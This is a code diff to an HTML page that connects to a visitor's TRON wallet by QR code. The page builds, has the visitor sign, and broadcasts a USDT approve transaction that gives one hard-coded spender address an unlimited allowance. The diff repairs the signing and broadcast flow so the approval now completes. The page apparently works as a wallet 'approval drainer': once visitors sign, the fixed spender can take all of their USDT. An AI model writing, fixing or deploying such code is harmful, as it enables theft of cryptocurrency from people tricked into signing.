@@ -6,38 +6,43 @@
 <title>TRON USDT Approve</title>
 
 <style>
-/* KEEP YOUR STYLE SAME */
-body{font-family:sans-serif;background:#0a0a0a;color:#fff;text-align:center;padding:30px}
-.step{padding:10px;margin:10px;background:#111;border-left:4px solid #333}
-.active{border-color:#f0a500}
-.done{border-color:#22c55e}
-.error{border-color:#ef4444}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:sans-serif;background:#0a0a0a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#111;padding:20px;border-radius:12px;width:100%;max-width:500px}
+.step{padding:10px;margin:10px 0;background:#0d0d0d;border-left:4px solid #333}
+.step.active{border-color:#f0a500}
+.step.done{border-color:#22c55e}
+.step.error{border-color:#ef4444}
+#qr{margin-top:20px}
+pre{font-size:12px;color:#aaa;margin-top:10px}
 </style>
 </head>
 
 <body>
 
+<div class="card">
 <h2>🔐 TRON USDT Approve</h2>
 
 <div id="s1" class="step">Connect Wallet</div>
 <div id="s2" class="step">Wallet</div>
-<div id="s3" class="step">Prepare</div>
+<div id="s3" class="step">Build TX</div>
 <div id="s4" class="step">Sign</div>
-<div id="s5" class="step">Done</div>
+<div id="s5" class="step">Broadcast</div>
 
 <div id="qr"></div>
 <pre id="log"></pre>
+</div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script type="module">
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
-
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+const TRONGRID = "https://api.trongrid.io";
 
-function step(id, state){
+function step(id,state){
   document.getElementById(id).className = "step " + state;
 }
 
@@ -45,9 +50,9 @@ function log(msg){
   document.getElementById("log").textContent += "\n" + msg;
 }
 
-// ✅ SAFE conversion
+// ✅ SAFE address conversion
 async function toHex(addr){
-  const res = await fetch("https://api.trongrid.io/wallet/validateaddress",{
+  const res = await fetch(TRONGRID + "/wallet/validateaddress",{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
     body:JSON.stringify({address:addr})
@@ -58,9 +63,49 @@ async function toHex(addr){
 
 // ✅ encode approve
 async function encodeApprove(spender){
-  const hex = (await toHex(spender)).slice(2).padStart(64,"0");
+  const spenderHex = (await toHex(spender)).slice(2).padStart(64,"0");
   const max = "f".repeat(64);
-  return "0x095ea7b3" + hex + max;
+  return "095ea7b3" + spenderHex + max;
+}
+
+// ✅ build TX (correct owner)
+async function buildTx(owner){
+  const ownerHex = (await toHex(owner)).slice(2);
+
+  const res = await fetch(TRONGRID + "/wallet/triggersmartcontract",{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      owner_address: ownerHex,
+      contract_address: (await toHex(USDT)).slice(2),
+      function_selector:"approve(address,uint256)",
+      parameter: await encodeApprove(SPENDER),
+      fee_limit:100000000,
+      call_value:0,
+      visible:false
+    })
+  });
+
+  const data = await res.json();
+  return data.transaction;
+}
+
+// ✅ broadcast
+async function broadcast(tx){
+  const res = await fetch(TRONGRID + "/wallet/broadcasttransaction",{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify(tx)
+  });
+  return await res.json();
+}
+
+// ✅ fix signature
+function fixSig(resp, tx){
+  if(resp.signature){
+    tx.signature = [resp.signature.replace(/^0x/,"")];
+  }
+  return tx;
 }
 
 async function main(){
@@ -72,29 +117,29 @@ async function main(){
     const client = await SignClient.init({
       projectId: PROJECT_ID,
       metadata:{
-        name:"TRON Approve",
-        description:"USDT approve",
+        name:"USDT Approve",
+        description:"TRON approve",
         url:location.origin,
         icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
 
-    // ✅ FIXED METHOD
+    // ✅ KEEP YOUR ORIGINAL CONNECT LOGIC
     const { uri, approval } = await client.connect({
       requiredNamespaces:{
         tron:{
-          methods:["tron_sendTransaction"], // 🔥 FIX
+          methods:["tron_signTransaction"], // keep this
           chains:[TRON_CHAIN],
           events:[]
         }
       }
     });
 
-    // QR (your same working system)
+    // QR
     new QRCode(document.getElementById("qr"), {
       text: uri,
-      width: 220,
-      height: 220
+      width: 200,
+      height: 200
     });
 
     const session = await approval();
@@ -108,30 +153,34 @@ async function main(){
     step("s2","done");
     step("s3","active");
 
-    const data = await encodeApprove(SPENDER);
+    const unsignedTx = await buildTx(wallet);
+    log("TX Built");
 
     step("s3","done");
     step("s4","active");
 
-    // 🔥 THIS IS THE REAL FIX
-    const result = await client.request({
+    const signed = await client.request({
       topic: session.topic,
       chainId: TRON_CHAIN,
       request:{
-        method:"tron_sendTransaction",
-        params:{
-          to: USDT,
-          data: data,
-          value: "0x0"
-        }
+        method:"tron_signTransaction",
+        params:{ transaction: unsignedTx }
       }
     });
 
-    step("s4","done");
-    step("s5","done");
+    const finalTx = fixSig(signed, unsignedTx);
 
-    log("SUCCESS:");
-    log(JSON.stringify(result,null,2));
+    step("s4","done");
+    step("s5","active");
+
+    const result = await broadcast(finalTx);
+
+    if(result.result){
+      step("s5","done");
+      log("SUCCESS TX: " + result.txid);
+    }else{
+      throw new Error(JSON.stringify(result));
+    }
 
   }catch(err){
     console.error(err);
